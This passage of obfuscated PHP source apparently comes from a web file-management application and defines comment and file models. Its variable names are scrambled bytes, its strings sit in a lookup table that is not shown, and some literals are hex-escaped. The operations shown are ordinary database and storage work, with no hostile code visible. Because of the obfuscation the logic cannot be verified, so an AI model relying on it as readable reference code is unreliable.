$ŒËè•áñ); if ($çØáØ©…) { $×›ƒÅÑò[$ã³óô×à[1780]] = $çØáØ©…; } $È¶™·¹¢ = $this->field($õâùˆ“)->where($×›ƒÅÑò)->group($ã³óô×à[569])->select(); return array_to_keyvalue($È¶™·¹¢, $ã³óô×à[569], $ã³óô×à[565]); } public function starTarget($¡±ˆõô, $Ü‹ˆƒ˜í) { $¶ñÔŸò² =& $_SERVER[²Ö÷öõ]; $ë‚÷ºñ£ = $¡±ˆõô + self::TYPE_STAR_OFFSET; $òú‹¢š† = array($¶ñÔŸò²[1780] => USER_ID, $¶ñÔŸò²[190] => $ë‚÷ºñ£, $¶ñÔŸò²[569] => $Ü‹ˆƒ˜í); $ÁóÀíøÉ = $this->where($òú‹¢š†)->find(); if ($ÁóÀíøÉ) { return $this->where(array($¶ñÔŸò²[475] => $ÁóÀíøÉ[$¶ñÔŸò²[475]]))->delete(); } $‰Ö›òÇ¶ = array($¶ñÔŸò²[2009] => 0, $¶ñÔŸò²[1780] => USER_ID, $¶ñÔŸò²[833] => 1, $¶ñÔŸò²[171] => $¶ñÔŸò²[12], $¶ñÔŸò²[190] => $ë‚÷ºñ£, $¶ñÔŸò²[569] => $Ü‹ˆƒ˜í, $¶ñÔŸò²[2012] => 0, $¶ñÔŸò²[2011] => 0); return $this->add($‰Ö›òÇ¶); } public function starTargetCount($ö—Çç’‚, $É­Õ ¾Ÿ) { $®¯Æ®× =& $_SERVER[²Ö÷öõ]; $¡ºïõÊ’ = $É­Õ ¾Ÿ + self::TYPE_STAR_OFFSET; $Æïë‡Åò = $this->commentCount($ö—Çç’‚, $¡ºïõÊ’); $ÑÈ¶…‘Ú = $this->commentCount($ö—Çç’‚, $¡ºïõÊ’, USER_ID); return array($®¯Æ®×[2014] => $Æïë‡Åò, $®¯Æ®×[2015] => $ÑÈ¶…‘Ú); } public function starTargetUserList($õ†¾ğ, $¡  Ø¯š) { $¹…´”¨› =& $_SERVER[²Ö÷öõ]; $¢×¨Ï·ü = $õ†¾ğ + self::TYPE_STAR_OFFSET; $·™¢³ƒ€ = array($¹…´”¨›[569] => $¡  Ø¯š, $¹…´”¨›[190] => $¢×¨Ï·ü); $õÑŸ–Ş = $this->where($·™¢³ƒ€)->count(); $Û‡³æé‰ = array($¹…´”¨›[332] => $õÑŸ–Ş, $¹…´”¨›[2016] => array()); if (!$õÑŸ–Ş) { return $Û‡³æé‰; } $£çÆŠ¸¶ = $this->field($¹…´”¨›[1780])->where($·™¢³ƒ€)->limit(500)->select(); $£çÆŠ¸¶ = array_to_keyvalue($£çÆŠ¸¶, $¹…´”¨›[12], $¹…´”¨›[1780]); $Û‡³æé‰[$¹…´”¨›[2016]] = Model($¹…´”¨›[577])->userListInfo($£çÆŠ¸¶); return $Û‡³æé‰; } public function prasiseUserList($•¨²×èÍ) { $»„»”Ğ =& $_SERVER[²Ö÷öõ]; $­×ËÒ¿î = array($»„»”Ğ[2017] => $•¨²×èÍ); $Š‡øç¼ = $this->where($­×ËÒ¿î)->find(); $º‡ºä²­ = _get($Š‡øç¼, $»„»”Ğ[2012], 0); $öÎ‰Ä• = array($»„»”Ğ[332] => $º‡ºä²­, $»„»”Ğ[2016] => array()); if (!$º‡ºä²­) { return $öÎ‰Ä•; } $‘àˆø•§ = Model($»„»”Ğ[2018])->field($»„»”Ğ[1780])->where($­×ËÒ¿î)->limit(500)->select(); $‘àˆø•§ = array_to_keyvalue($‘àˆø•§, $»„»”Ğ[12], $»„»”Ğ[1780]); $öÎ‰Ä•[$»„»”Ğ[2016]] = Model($»„»”Ğ[577])->userListInfo($‘àˆø•§); return $öÎ‰Ä•; } public function remove($ÜšÃı¿™) { $´ ­ÓÕî =& $_SERVER[²Ö÷öõ]; $­·Ğœ½¹ = array($´ ­ÓÕî[2010] => $ÜšÃı¿™); $Ë‘œµ« = $this->where($­·Ğœ½¹)->find(); if ($Ë‘œµ«[$´ ­ÓÕî[2009]]) { $this->where(array($´ ­ÓÕî[2010] => $Ë‘œµ«[$´ ­ÓÕî[2009]]))->setAdd($´ ­ÓÕî[2011], -1); } return $this->where($­·Ğœ½¹)->delete(); } public function edit($øòËñ®É, $µ“Ö†»†) { $ê—Èùàó =& $_SERVER[²Ö÷öõ]; $ì¤·Îå = array($ê—Èùàó[2010] => $øòËñ®É); return $this->where($ì¤·Îå)->save(array($ê—Èùàó[2019] => $µ“Ö†»†)); } public function prasise($éæ¬œŠ) { $¦ùĞİù¾ =& $_SERVER[²Ö÷öõ]; $ÉÖü¾­ş = Model($¦ùĞİù¾[2020]); $•ÌÃÇÌõ = array($¦ùĞİù¾[2010] => $éæ¬œŠ, $¦ùĞİù¾[1771] => USER_ID); $Óá¦ÏÈ¤ = $ÉÖü¾­ş->where($•ÌÃÇÌõ)->find(); if (!$Óá¦ÏÈ¤) { $ÉÖü¾­ş->add($•ÌÃÇÌõ); $Ü¦áãÂÅ = $this->where(array($¦ùĞİù¾[2010] => $éæ¬œŠ))->setAdd($¦ùĞİù¾[2012], 1); } else { $ÉÖü¾­ş->where($•ÌÃÇÌõ)->delete(); $Ü¦áãÂÅ = $this->where(array($¦ùĞİù¾[2010] => $éæ¬œŠ))->setAdd($¦ùĞİù¾[2012], -1); } return $Ü¦áãÂÅ; } public function targetInfo($àªçŞî¨, $õÛÀ”¸º) { $ºÆ´ä½Š =& $_SERVER[²Ö÷öõ]; $·ïŠ’Ñ = array($ºÆ´ä½Š[648] => $àªçŞî¨, $ºÆ´ä½Š[649] => $õÛÀ”¸º); $ñÅü÷îó = $this->where($·ïŠ’Ñ)->count(); $Ì¼°ªó„ = "\x52\x49\x47\x48\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\143\157\155\x6d\145\156\x74\x5f\x70\x72\x61\x69\163\145\40\x73\164\x61\162\x20\157\x6e\x20\143\x6f\x6d\155\145\x6e\x74\56\143\157\155\x6d\x65\156\164\111\104\x20\x3d\x20\x73\x74\141\x72\x2e\143\157\x6d\x6d\145\x6e\x74\111\x44"; $”÷Í’º = $this->alias($ºÆ´ä½Š[430])->where($·ïŠ’Ñ)->join($Ì¼°ªó„, $ºÆ´ä½Š[2021])->count(); $§óõµà = array($ºÆ´ä½Š[2022] => $ñÅü÷îó, $ºÆ´ä½Š[2023] => $”÷Í’º); return $§óõµà; } public function listData($âËíöş) { $Ÿ•®¤½– =& $_SERVER[²Ö÷öõ]; if (isset($âËíöş[$Ÿ•®¤½–[2024]])) { if ($âËíöş[$Ÿ•®¤½–[2024]]) { $âËíöş[$Ÿ•®¤½–[2017]] = array($Ÿ•®¤½–[1100], intval($âËíöş[$Ÿ•®¤½–[2024]])); } unset($âËíöş[$Ÿ•®¤½–[2024]]); } if (isset($âËíöş[$Ÿ•®¤½–[2025]])) { if ($âËíöş[$Ÿ•®¤½–[2025]]) { $âËíöş[$Ÿ•®¤½–[2017]] = array($Ÿ•®¤½–[1097], intval($âËíöş[$Ÿ•®¤½–[2025]])); } unset($âËíöş[$Ÿ•®¤½–[2025]]); } return $this->_listData($âËíöş); } private function _listData($´Äšõ®î) { $–üÑÀî¤ =& $_SERVER[²Ö÷öõ]; $•ğÇŠß = $this->where($´Äšõ®î)->_makeOrder()->selectPage(100); $this->_listAppendParent($•ğÇŠß[$–üÑÀî¤[445]]); $this->_listAppendUser($•ğÇŠß[$–üÑÀî¤[445]]); $this->_listAppendMeta($•ğÇŠß[$–üÑÀî¤[445]]); return $•ğÇŠß; } private function _makeOrder() { $ğÏÒ©¦Å =& $_SERVER[²Ö÷öõ]; $Ñ´„¶ = array($ğÏÒ©¦Å[2012], $ğÏÒ©¦Å[2011], $ğÏÒ©¦Å[231]); $Ñ÷ÁüíË = Input::get($ğÏÒ©¦Å[530], $ğÏÒ©¦Å[7], $ğÏÒ©¦Å[497], $Ñ´„¶); $ô¨ë™åË = Input::get($ğÏÒ©¦Å[531], $ğÏÒ©¦Å[7], $ğÏÒ©¦Å[1773], array($ğÏÒ©¦Å[2026], $ğÏÒ©¦Å[526])); $úûÛØÖ = $Ñ÷ÁüíË . $ğÏÒ©¦Å[53] . $ô¨ë™åË; return $this->order($úûÛØÖ); } private function _listAppendParent(&$ÎşÒ Â„) { $¤„†‚³ =& $_SERVER[²Ö÷öõ]; $‘’±„ëÏ = array_unique(array_to_keyvalue($ÎşÒ Â„, $¤„†‚³[12], $¤„†‚³[2009])); $‘’±„ëÏ = array_remove_value($‘’±„ëÏ, $¤„†‚³[228]); if (!$‘’±„ëÏ) { return; } $¬¦êØœ¥ = $this->where(array($¤„†‚³[2010] => array($¤„†‚³[7], $‘’±„ëÏ)))->select(); $¬¦êØœ¥ = array_to_keyvalue($¬¦êØœ¥, $¤„†‚³[2017]); foreach ($ÎşÒ Â„ as &$ç¿ç¨ç) { if (isset($¬¦êØœ¥[$ç¿ç¨ç[$¤„†‚³[2009]]])) { $ç¿ç¨ç[$¤„†‚³[2027]] = $¬¦êØœ¥[$ç¿ç¨ç[$¤„†‚³[2009]]]; } } unset($ç¿ç¨ç); } private function _listAppendUser(&$æË€èŸ¿) { $á¶û ‹Ë =& $_SERVER[²Ö÷öõ]; $Ğ•±‹½Â = array_unique(array_to_keyvalue($æË€èŸ¿, $á¶û ‹Ë[12], $á¶û ‹Ë[1780])); $Ğ•±‹½Â = array_remove_value($Ğ•±‹½Â, $á¶û ‹Ë[228]); if (count($Ğ•±‹½Â) == 0) { return; } foreach ($æË€èŸ¿ as $²¶ôê½…) { if (isset($²¶ôê½…[$á¶û ‹Ë[2027]])) { $Ğ•±‹½Â[] = $²¶ôê½…[$á¶û ‹Ë[2027]][$á¶û ‹Ë[1780]]; } } $ªÀ¹ºšÖ = Model($á¶û ‹Ë[598])->userListInfo($Ğ•±‹½Â); foreach ($æË€èŸ¿ as &$²¶ôê½…) { $²¶ôê½…[$á¶û ‹Ë[662]] = $ªÀ¹ºšÖ[$²¶ôê½…[$á¶û ‹Ë[1780]]]; if (isset($²¶ôê½…[$á¶û ‹Ë[2027]])) { $²¶ôê½…[$á¶û ‹Ë[2027]][$á¶û ‹Ë[662]] = $ªÀ¹ºšÖ[$²¶ôê½…[$á¶û ‹Ë[2027]][$á¶û ‹Ë[1780]]]; } } unset($²¶ôê½…); } private function _listAppendMeta(&$ú«õåäë) { $Ñ´‰¹Ë¬ =& $_SERVER[²Ö÷öõ]; $È€¢ãÈİ = array_unique(array_to_keyvalue($ú«õåäë, $Ñ´‰¹Ë¬[12], $Ñ´‰¹Ë¬[2017])); $È€¢ãÈİ = array_remove_value($È€¢ãÈİ, $Ñ´‰¹Ë¬[228]); if (!$È€¢ãÈİ) { return; } foreach ($ú«õåäë as $øÅªÊè©) { if (isset($øÅªÊè©[$Ñ´‰¹Ë¬[2027]])) { $È€¢ãÈİ[] = $øÅªÊè©[$Ñ´‰¹Ë¬[2027]][$Ñ´‰¹Ë¬[2017]]; } } $‰ñÀÛ¨ˆ = $this->metaList($È€¢ãÈİ); if (!$‰ñÀÛ¨ˆ) { return !1; } foreach ($ú«õåäë as &$øÅªÊè©) { $øÅªÊè©[$Ñ´‰¹Ë¬[539]] = $‰ñÀÛ¨ˆ[$øÅªÊè©[$Ñ´‰¹Ë¬[2017]]]; if (isset($øÅªÊè©[$Ñ´‰¹Ë¬[2027]])) { $øÅªÊè©[$Ñ´‰¹Ë¬[2027]][$Ñ´‰¹Ë¬[539]] = $‰ñÀÛ¨ˆ[$øÅªÊè©[$Ñ´‰¹Ë¬[2027]][$Ñ´‰¹Ë¬[2017]]]; } } unset($øÅªÊè©); } private function metaList($ÈêÕÍ×Ü) { $±ˆõÅ ó =& $_SERVER[²Ö÷öõ]; if (!$ÈêÕÍ×Ü) { return array(); } $‰Î®Õû§ = array($±ˆõÅ ó[2017] => array($±ˆõÅ ó[7], $ÈêÕÍ×Ü)); $èıÏïÍ = Model($±ˆõÅ ó[2028])->where($‰Î®Õû§)->select(); $èıÏïÍ = array_to_keyvalue_group($èıÏïÍ, $±ˆõÅ ó[2017]); foreach ($èıÏïÍ as $ÀĞ÷ÌŠ– => $ú„®µ¢) { $¬Â´ƒû¾ = array(); foreach ($ú„®µ¢ as $ı›ƒé£ ) { $¬Â´ƒû¾[$ı›ƒé£ [$±ˆõÅ ó[97]]] = $ı›ƒé£ [$±ˆõÅ ó[450]]; } $èıÏïÍ[$ÀĞ÷ÌŠ–] = $¬Â´ƒû¾; } return $èıÏïÍ ? $èıÏïÍ : array(); } public function removeTarget($Ò¨¦™±Ä, $×æİïñ¸) { $Á‰ö‚Âå =& $_SERVER[²Ö÷öõ]; if (!$×æİïñ¸) { return !0; } $×æİïñ¸ = is_array($×æİïñ¸) ? $×æİïñ¸ : array($×æİïñ¸); $²ñÀ¿Ğî = array($Á‰ö‚Âå[190] => $Ò¨¦™±Ä, $Á‰ö‚Âå[569] => array($Á‰ö‚Âå[7], $×æİïñ¸)); $À¨–Ôâ– = $this->field($Á‰ö‚Âå[2017])->where($²ñÀ¿Ğî)->select(); $ñë†÷Ä = array_to_keyvalue($À¨–Ôâ–, $Á‰ö‚Âå[12], $Á‰ö‚Âå[2017]); if (!$ñë†÷Ä) { return !0; } $²ñÀ¿Ğî = array($Á‰ö‚Âå[2017] => array($Á‰ö‚Âå[7], $ñë†÷Ä)); $this->where($²ñÀ¿Ğî)->delete(); Model($Á‰ö‚Âå[2020])->where($²ñÀ¿Ğî)->delete(); Model($Á‰ö‚Âå[2029])->where($²ñÀ¿Ğî)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\145\137\x63\157\156\164\145\x6e\164\163"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\124\151\155\145", "\x74\x69\155\145", "\x69\156\163\x65\x72\x74", "\146\x75\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\145"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\155\x65" => "\151\x6f\x5f\x66\151\154\x65\x5f\155\145\164\141", "\155\x65\x74\141\x46\x69\145\154\x64" => "\146\151\154\x65\x49\x44"); public function fileInfo($Ëí§®Â) { $ıİÒÀ³Š =& $_SERVER[²Ö÷öõ]; static $¥«Ç  = array(); if (!isset($¥«Ç [$Ëí§®Â])) { $œáƒ»Ş = $ıİÒÀ³Š[2030]; $ïïËÒó† = Model($ıİÒÀ³Š[544])->field($œáƒ»Ş)->where(array($ıİÒÀ³Š[542] => $Ëí§®Â))->find(); $¥«Ç [$Ëí§®Â] = $ïïËÒó†; } return $¥«Ç [$Ëí§®Â]; } public function addFileByContent($ÔÊ†ëŸ“ = '', $ı÷­§¶© = '') { $’ï›ü’¿ =& $_SERVER[²Ö÷öõ]; $±»áŒİ‹ = TEMP_PATH . $’ï›ü’¿[2031]; if (!is_dir($±»áŒİ‹)) { mk_dir($±»áŒİ‹); } $Ûñˆ´‘è = $±»áŒİ‹ . $’ï›ü’¿[2032] . rand_string(16); file_put_contents($Ûñˆ´‘è, $ÔÊ†ëŸ“); $â±¹…Î = $this->addFile($Ûñˆ´‘è, $ı÷­§¶©, !0); if (file_exists($Ûñˆ´‘è)) { @unlink($Ûñˆ´‘è); } return $â±¹…Î; } public function createFileName($Õ‰ŞÂÊ, $Óì‡‹ƒŞ = false, $Çüàğªé = false) { $Á®û‹î‚ =& $_SERVER[²Ö÷öõ]; $ç”ÅÛğÙ = IO::init($Á®û‹î‚[8]); $İúéÎĞÛ = $this->makeFilePath($Õ‰ŞÂÊ, $ç”ÅÛğÙ, $Óì‡‹ƒŞ, $Çüàğªé); $±Õ¿âµİ = $ç”ÅÛğÙ->pathFather($İúéÎĞÛ); static $ïĞ®°™… = false; $·ñ’“ãÅ = $Á®û‹î‚[2033] . md5($±Õ¿âµİ); if (!$ïĞ®°™… && !Cache::get($·ñ’“ãÅ)) { $ïĞ®°™… = !0; $İª«¦ÜÄ = IO::mkdir($±Õ¿âµİ); if (!IO::exist($İª«¦ÜÄ . $Á®û‹î‚[880])) { IO::mkfile($İª«¦ÜÄ . $Á®û‹î‚[880]); } Cache::set($·ñ’“ãÅ, 1, 3600 * 2); } return $İúéÎĞÛ; } public function makeFilePath($ôìÃçÎ², $™ªÒÂ’¦, $î­Ûˆç— = false, $»²ş¥©í = false) { $ôô˜¸ø² =& $_SERVER[²Ö÷öõ]; $Ã°±“¿ = Model($ôô˜¸ø²[853])->get($ôô˜¸ø²[2034]); $õ«ØìÏ‘ = KodIO::defaultIO() . date($ôô˜¸ø²[2035]); $ÀÖøšÛ¢ = $õ«ØìÏ‘ . rand_string(5) . short_id(100); $ôìÃçÎ² = str_replace($ôô˜¸ø²[8], $ôô˜¸ø²[11], KodIO::clear($ôìÃçÎ²)); $ãó€±äî = $™ªÒÂ’¦->ext($ôìÃçÎ²); if (!$ôìÃçÎ²) { $Ã°±“¿ = $ôô˜¸ø²[859]; } switch ($Ã°±“¿) { case $ôô˜¸ø²[2036]: if ($ãó€±äî) { $ÀÖøšÛ¢ = $ÀÖøšÛ¢ . $ôô˜¸ø²[10] . $ãó€±äî; } if ($ãó€±äî == $ôô˜¸ø²[1972]) { $ÀÖøšÛ¢ .= $ôô˜¸ø²[1299]; } break; case $ôô˜¸ø²[2037]: $¡¶ÜÀ˜ = Model($ôô˜¸ø²[853])->get($ôô˜¸ø²[854]); $È­¢‚ğ = substr(md5($ôô˜¸ø²[855] . $¡¶ÜÀ˜ . date($ôô˜¸ø²[832])), 0, 8); $ Î„ñè¸ = KodIO::defaultDriver(); $õ«ØìÏ‘ = $ôô˜¸ø²[1332] . $ Î„ñè¸[$ôô˜¸ø²[475]] . $ôô˜¸ø²[484] . date($ôô˜¸ø²[2038]) . $È­¢‚ğ . $ôô˜¸ø²[8]; if ($ãó€±äî == $ôô˜¸ø²[1972]) { $ôìÃçÎ² .= $ôô˜¸ø²[1299]; } $Êöø•· = $ôô˜¸ø²[2039] . $õ«ØìÏ‘ . $ôìÃçÎ²; CacheLock::lock($Êöø•·); $ÀÖøšÛ¢ = $õ«ØìÏ‘ . $ôìÃçÎ²; if (IO::exist($õ«ØìÏ‘ . $ôìÃçÎ²)) { $ ğ’õŠ’ = substr($ôìÃçÎ², 0, strlen($ôìÃçÎ²) - strlen($ãó€±äî)); $ãîşĞ‡Ù = $»²ş¥©í ? substr($»²ş¥©í, 0, 5) : ($î­Ûˆç— ? substr($î­Ûˆç—, 0, 5) : rand_string(5)); $ÀÖøšÛ¢ = $õ«ØìÏ‘ . $ ğ’õŠ’ . $ãîşĞ‡Ù; if ($ãó€±äî) { $ÀÖøšÛ¢ = $ÀÖøšÛ¢ . $ôô˜¸ø²[10] . $ãó€±äî; } } if (IO::isOsDriver($ÀÖøšÛ¢) && !IO::isUploadServer($ÀÖøšÛ¢)) { if (IO::exist($ÀÖøšÛ¢)) { return $ÀÖøšÛ¢; } $ºÑåÂ» = IO::setContent($ÀÖøšÛ¢, $ôô˜¸ø²[12]); if (!$ºÑåÂ») { show_json($ôô˜¸ø²[2040], !1); } } CacheLock::unlock($Êöø•·); break; case $ôô˜¸ø²[859]: break; default: break; } return $ÀÖøšÛ¢; } public function addFileByRemote($¡ª¹‡¿, $ç°Í§‹©, $­›ÆÕ†Ã = array()) { $àËÛ²ë² =& $_SERVER[²Ö÷öõ]; if (!IO::exist($¡ª¹‡¿)) { return !1; } $ÎÓ†±ø = $­›ÆÕ†Ã[$àËÛ²ë²[547]] ? $­›ÆÕ†Ã[$àËÛ²ë²[547]] : $àËÛ²ë²[12]; $û¢ŒÉ«ä = IO::hashMd5($¡ª¹‡¿, $ÎÓ†±ø); $ğÃİˆª = KodIO::defaultDriver(); $Üö»çãÎ = array($àËÛ²ë²[617] => IO::size($¡ª¹‡¿), $àËÛ²ë²[2041] => 1, $àËÛ²ë²[494] => $ç°Í§‹©, $àËÛ²ë²[891] => $ğÃİˆª[$àËÛ²ë²[475]], $àËÛ²ë²[495] => $¡ª¹‡¿, $àËÛ²ë²[2042] => $­›ÆÕ†Ã[$àËÛ²ë²[672]] ? $­›ÆÕ†Ã[$àËÛ²ë²[672]] : IO::hashSimple($¡ª¹‡¿), $àËÛ²ë²[2043] => $û¢ŒÉ«ä ? $û¢ŒÉ«ä : $ÎÓ†±ø); if ($‡èø×’ = $this->addFileCheckExist($Üö»çãÎ[$àËÛ²ë²[672]], $Üö»çãÎ[$àËÛ²ë²[547]], $Üö»çãÎ[$àËÛ²ë²[79]])) { return $‡èø×’; } return $this->addFileData($Üö»çãÎ); } private function addFileData($ı¸¦‚­”) { $ÇÉ™¯†Ğ =& $_SERVER[²Ö÷öõ]; if (!$ı¸¦‚­”) { return !1; } $ı¸¦‚­”[$ÇÉ™¯†Ğ[79]] = intval($ı¸¦‚­”[$ÇÉ™¯†Ğ[79]]); if (!$ı¸¦‚­”[$ÇÉ™¯†Ğ[79]] && strlen($ı¸¦‚­”[$ÇÉ™¯†Ğ[672]]) > 32) { $ı¸¦‚­”[$ÇÉ™¯†Ğ[79]] = intval(substr($ı¸¦‚­”[$ÇÉ™¯†Ğ[672]], 32)); } $ÉĞÑ á = $this->add($ı¸¦‚­”); return $this->find($ÉĞÑ á); } public function addFile($ñ‚é¡Û, $»ëùºµÑ, $àë¨Ìï = false) { $‰Ñ€¨° =& $_SERVER[²Ö÷öõ]; $ÂèÂ ·¸ = IO::hashSimple($ñ‚é¡Û); $ÄåßàÙµ = IO::size($ñ‚é¡Û); $ÍÖ‹äŞ¶ = $ÄåßàÙµ <= 1024 * 1024 * 10 ? IO::hashMd5($ñ‚é¡Û) : $‰Ñ€¨°[12]; $µŒ€ô›ú = $‰Ñ€¨°[2044] . $ÂèÂ ·¸; CacheLock::lock($µŒ€ô›ú); if ($ÍÖ‹äŞ¶ && $ÂèÂ ·¸) { $´ˆ¡°‘  = $this->addFileCheckExist($ÂèÂ ·¸, $ÍÖ‹äŞ¶, $ÄåßàÙµ); if ($´ˆ¡°‘ ) { CacheLock::unlock($µŒ€ô›ú); return $´ˆ¡°‘ ; } } $Êò»û±ß = $this->addFileMake($ñ‚é¡Û, $ÄåßàÙµ, $ÂèÂ ·¸, $ÍÖ‹äŞ¶, $»ëùºµÑ, $àë¨Ìï); $âÀô”Ê£ = $this->addFileData($Êò»û±ß); CacheLock::unlock($µŒ€ô›ú); if (!$ÍÖ‹äŞ¶ && $âÀô”Ê£) { $this->fileMd5Check($âÀô”Ê£); } return $âÀô”Ê£; } public function fileMd5Check($Ûï¹à›ê) { $Üõ¹ú =& $_SERVER[²Ö÷öõ]; $¨—ø¸øú = array($Ûï¹à›ê[$Üõ¹ú[541]], $Ûï¹à›ê[$Üõ¹ú[87]]); $çÊÙúå¢ = $Üõ¹ú[2045] . $Ûï¹à›ê[$Üõ¹ú[87]]; $—ˆğ–À = $Üõ¹ú[2046] . $Ûï¹à›ê[$Üõ¹ú[541]]; TaskQueue::add($Üõ¹ú[2047], $¨—ø¸øú, $çÊÙúå¢, $—ˆğ–À); } public function fileMd5Set($©ŒïÌ°‚, $‰…“¬“·) { $ô¶ŠÇµ =& $_SERVER[²Ö÷öõ]; $Ñ•æ½÷ = $this->find($©ŒïÌ°‚); if (!$Ñ•æ½÷ || $Ñ•æ½÷[$ô¶ŠÇµ[547]]) { return; } $œ‘¹ï” = IO::hashMd5($‰…“¬“·); if (!$œ‘¹ï”) { return $ô¶ŠÇµ[12]; } $this->where(array($ô¶ŠÇµ[541] => $©ŒïÌ°‚))->save(array($ô¶ŠÇµ[547] => $œ‘¹ï”)); } public function addFileMake($–ıºÍ¹Ã, $·”Ä×Üñ, $©§ÍÁÈù, $ó€×§Â¸, $ÂµÂ £¡, $‡…œØüƒ) { $ë–™ë¤ß =& $_SERVER[²Ö÷öõ]; $šÃª¤ÁÃ = $this->createFileName($ÂµÂ £¡, $©§ÍÁÈù, $ó€×§Â¸); $Ò•ÚıÒ“ = get_path_father($šÃª¤ÁÃ); $Ğ„ŠşôÑ = get_path_this($šÃª¤ÁÃ); if ($‡…œØüƒ) { $Ïşªø˜‘ = IO::move($–ıºÍ¹Ã, $Ò•ÚıÒ“, !1, $Ğ„ŠşôÑ); } else { $Ïşªø˜‘ = IO::copy($–ıºÍ¹Ã, $Ò•ÚıÒ“, !1, $Ğ„ŠşôÑ); } if (!$Ïşªø˜‘) { return !1; } $ºÁÆ¶€Ğ = KodIO::defaultDriver(); $¾ïòÁÔŸ = array($ë–™ë¤ß[617] => $·”Ä×Üñ, $ë–™ë¤ß[2041] => 1, $ë–™ë¤ß[494] => $ÂµÂ £¡, $ë–™ë¤ß[891] => $ºÁÆ¶€Ğ[$ë–™ë¤ß[475]], $ë–™ë¤ß[495] => $šÃª¤ÁÃ, $ë–™ë¤ß[2042] => $©§ÍÁÈù, $ë–™ë¤ß[2043] => $ó€×§Â¸); return $¾ïòÁÔŸ; } public function addFileCheckExist($…¡ìö¬Ÿ, $‡‹‹ë¢, $Û„ÈëÂ) { $Î˜Ş÷è =& $_SERVER[²Ö÷öõ]; $ª·´“Û = $this->findByHash($…¡ìö¬Ÿ, $‡‹‹ë¢); if (!$ª·´“Û) { return !1; } $½ÂÕ—Ÿê = array($Î˜Ş÷è[2041] => intval($ª·´“Û[$Î˜Ş÷è[2048]]) + 1, $Î˜Ş÷è[617] => $Û„ÈëÂ); $this->where(array($Î˜Ş÷è[542] => $ª·´“Û[$Î˜Ş÷è[541]]))->save($½ÂÕ—Ÿê); return $ª·´“Û; } public function remove($äº·×Ç) { $this->linkCountChange($äº·×Ç, !1); $this->clearEmpty(); return !0; } public function linkAdd($¢Œşë´§) { $this->linkCountChange($¢Œşë´§, !0); } public function linkCountChange($Äê’Œˆ, $¨Ş›½¬) { $œÔ¹„âÂ =& $_SERVER[²Ö÷öõ]; if (!$Äê’Œˆ) { return; } if (!is_array($Äê’Œˆ)) { $Äê’Œˆ = array($Äê’Œˆ); } $ïô“±Ëâ = array(); foreach ($Äê’Œˆ as $ı…•íû) { $½İ¶ÜİÆ = $ı…•íû . $œÔ¹„âÂ[12]; if (!$ïô“±Ëâ[$½İ¶ÜİÆ]) { $ïô“±Ëâ[$½İ¶ÜİÆ] = 0; } $ïô“±Ëâ[$½İ¶ÜİÆ]++; } $Š´ò¯áÊ = array(); foreach ($ïô“±Ëâ as $ı…•íû => $šÇŞ›¶) { $½İ¶ÜİÆ = $šÇŞ›¶ . $œÔ¹„âÂ[12]; if (!$Š´ò¯áÊ[$½İ¶ÜİÆ]) { $Š´ò¯áÊ[$½İ¶ÜİÆ] = array(); } $Š´ò¯áÊ[$½İ¶ÜİÆ][] = $ı…•íû; } foreach ($Š´ò¯áÊ as $šÇŞ›¶ => $ó¯ÒÖ®) { if (!$ó¯ÒÖ®) { continue; } $šÇŞ›¶ = $¨Ş›½¬ ? $šÇŞ›¶ : -intval($šÇŞ›¶); $â¤ø¡Ç¤ = array($œÔ¹„âÂ[541] => array($œÔ¹„âÂ[7], $ó¯ÒÖ®)); if ($šÇŞ›¶ < 0) { $â¤ø¡Ç¤[$œÔ¹„âÂ[2048]] = array($œÔ¹„âÂ[1101], abs($šÇŞ›¶)); } $this->where($â¤ø¡Ç¤)->setAdd($œÔ¹„âÂ[2048], $šÇŞ›¶); } } public function findByHash($†Æíé¶‚, $ÀĞïé€˜ = false) { $û€’²Ë× =& $_SERVER[²Ö÷öõ]; if (!$†Æíé¶‚ && !$ÀĞïé€˜) { return !1; } $€ÈÒü°İ = array($û€’²Ë×[2042] => $†Æíé¶‚); if ($ÀĞïé€˜) { $€ÈÒü°İ = array($û€’²Ë×[2043] => $ÀĞïé€˜); } return $this->order($û€’²Ë×[2049])->where($€ÈÒü°İ)->find(); } public function clearEmpty($’åìé • = 0) { $İ®ã³¶§ =& $_SERVER[²Ö÷öõ]; $°Ú‹êşÌ = time() - 3600 * 24 * $’åìé •; $Ù°’ûì = $İ®ã³¶§[2050] . $°Ú‹êşÌ; $°„ÚŞçÇ = $this->where($Ù°’ûì)->select(); if (!$°„ÚŞçÇ) { return; } $û¶›å‰ì = new Task($İ®ã³¶§[2051], $İ®ã³¶§[12], count($°„ÚŞçÇ)); foreach ($°„ÚŞçÇ as $¤ğñ¼úØ) { $û¶›å‰ì->update(1); $this->resetFile($¤ğñ¼úØ); } $û¶›å‰ì->end(); } public function resetFile($Ï‚ø™Üú) { $Õ¿†·“” =& $_SERVER[²Ö÷öõ]; $–§¨®¯’ = array($Õ¿†·“”[542] => $Ï‚ø™Üú[$Õ¿†·“”[541]]); $çØİ¼À¨ = Model($Õ¿†·“”[1428])->where($–§¨®¯’)->count(); $¬Ó©¶¹â = Model($Õ¿†·“”[2052])->where($–§¨®¯’)->count(); $Õ÷—“Öú = intval($çØİ¼À¨) + intval($¬Ó©¶¹â); if ($Õ÷—“Öú == 0) { IO::remove($Ï‚ø™Üú[$Õ¿†·“”[87]]); Model($Õ¿†·“”[2053])->delete($Ï‚ø™Üú[$Õ¿†·“”[541]]); $this->where($–§¨®¯’)->delete(); $this->metaSet($Ï‚ø™Üú[$Õ¿†·“”[541]], null, null); write_log(ACTION . $Õ¿†·“”[2054] . KodUser::id() . $Õ¿†·“”[2055] . $Ï‚ø™Üú[$Õ¿†·“”[541]] . $Õ¿†·“”[2056] . $Ï‚ø™Üú[$Õ¿†·“”[79]] . $Õ¿†·“”[201] . $Ï‚ø™Üú[$Õ¿†·“”[87]], $Õ¿†·“”[2057]); return; } if ($Ï‚ø™Üú[$Õ¿†·“”[2048]] != $Õ÷—“Öú) { $this->where($–§¨®¯’)->save(array($Õ¿†·“”[2041] => $Õ÷—“Öú)); } } public function storageInfo($£à¦¤‹É = false) { $šãÌÚş =& $_SERVER[²Ö÷öõ]; $ÊñıÎâÖ = $this->count() + 0.0; $£õßàï¾ = 0; $ø‹×·Éê = 1; 